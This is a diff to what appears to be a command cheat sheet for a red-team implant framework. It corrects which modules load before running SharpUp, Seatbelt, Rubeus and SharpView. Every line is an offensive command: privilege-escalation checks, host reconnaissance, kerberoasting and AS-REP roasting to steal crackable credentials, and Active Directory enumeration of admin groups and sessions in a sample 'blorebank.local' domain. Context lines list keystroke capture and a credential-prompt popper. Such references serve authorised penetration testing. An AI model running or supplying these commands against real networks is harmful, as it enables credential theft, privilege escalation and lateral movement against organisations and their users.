@@ -82,10 +82,12 @@ stop-keystrokes
 testadcredential domain username password
 testlocalcredential username password
 cred-popper
+loadmodule SharpUp.exe
+run-exe SharpUp.Program SharpUp
 
 Privilege Escalation:
 =======================
-loadmodule SharpView.exe
+loadmodule Seatbelt.exe
 run-exe Seatbelt.Program Seatbelt all
 run-exe Seatbelt.Program Seatbelt BasicOSInfo
 run-exe Seatbelt.Program Seatbelt SysmonConfig
@@ -94,13 +96,16 @@ run-exe Seatbelt.Program Seatbelt RegistryAutoRuns
 
 Network Tasks / Lateral Movement:
 ====================================
-loadmodule SharpView.exe
+loadmodule Rubeus.exe
 run-exe Rubeus.Program Rubeus kerberoast
 run-exe Rubeus.Program Rubeus asreproast /user:username
 
 Network Tasks / Lateral Movement:
 ====================================
+loadmodule SharpView.exe
 run-exe SharpView.Program SharpView Get-NetUser -SamAccountName ben
+run-exe SharpView.Program SharpView Get-NetGroup -Name *admin* -Domain -Properties samaccountname,member -Recurse
+run-exe SharpView.Program SharpView Get-NetGroupMember -LDAPFilter GroupName=*Admins* -Recurse -Properties samaccountname
 run-exe SharpView.Program SharpView Get-NetUser -Name deb -Domain blorebank.local
 run-exe SharpView.Program SharpView Get-NetSession -Domain blorebank.local
 run-exe SharpView.Program SharpView Get-DomainController -Domain blorebank.local
